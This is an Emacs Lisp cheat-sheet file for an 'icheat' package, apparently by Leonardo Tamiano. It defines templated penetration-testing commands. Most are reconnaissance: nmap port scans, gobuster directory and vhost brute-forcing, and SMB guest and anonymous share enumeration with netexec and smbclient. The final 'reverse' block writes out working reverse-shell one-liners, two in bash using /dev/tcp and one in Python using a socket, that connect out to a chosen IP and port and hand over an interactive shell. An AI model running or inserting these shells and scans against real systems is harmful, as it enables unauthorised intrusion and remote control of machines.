;;; pt.el --- Useful cheathseet for penetration testing -*- lexical-binding: t -*-
;;
;; Let's see icheat in practice by defining useful commands in the
;; context of a penetration test.
;;
;; Author: Leonardo Tamiano

(require 'icheat)

;; =============================================

(icheat-def-fmt "ip" nil)
(icheat-def-fmt "port" nil)
(icheat-def-fmt "domain" nil)
(icheat-def-fmt "share" nil)

(icheat-def-fmt
 "wordlist"
 (("directory-list-2.3-small.txt"  . "/home/leo/tool/wordlist/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt")
  ("directory-list-2.3-medium.txt" . "/home/leo/tool/wordlist/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt")
  ("directory-list-2.3-big.txt"    . "/home/leo/tool/wordlist/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt")
  ))

;; =============================================

(icheat-def-fmt
 "extension"
 (("php" . "php")
  ))

(icheat-def-cmd
 "ping"
 (("standard"       . "ping -c2 %ip")))

(icheat-def-cmd
 "nmap"
 (("standard"       . "nmap -sC -sV --min-rate 1000 %ip")
  ("full-tcp-ports" . "nmap -p- --min-rate 1000 %ip")
  ("standard-ad"    . "nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,54296 -sCV %ip")))

(icheat-def-cmd
 "gobuster"
 (("dir+standard"   . "gobuster dir -t 30 -u %ip -w %wordlist")
  ("dir+recursive"  . "gobuster dir -r -t 30 -u %ip -w %wordlist")
  ("dir+extension"  . "gobuster dir -r -t 30 -u %ip -w %wordlist -x %extension")
  ("vhost+standard" . "gobuster vhost -u %domain -w %wordlist")
  ))

(icheat-def-cmd
 "smb"
 (("guest-access"        . "netexec smb %domain -u guest -p '' --shares")
  ("anonymous-access"    . "netexec smb %domain --shares")
  ("smbclient anonymous" . "smbclient -N //%domain/%share")
  ))

(icheat-def-cmd
 "netexec"
 (("hosts"        . "netexec smb %ip --generate-hosts-file hosts")
  ))

(icheat-def-cmd
 "reverse"
 (("bash-1"   . "bash -i >& /dev/tcp/%ip/%port 0>&1")
  ("bash-2"   . "bash -c \"bash -i >& /dev/tcp/%ip/%port 0>&1\"")
  ("python-1" . "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%ip\",%port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")))
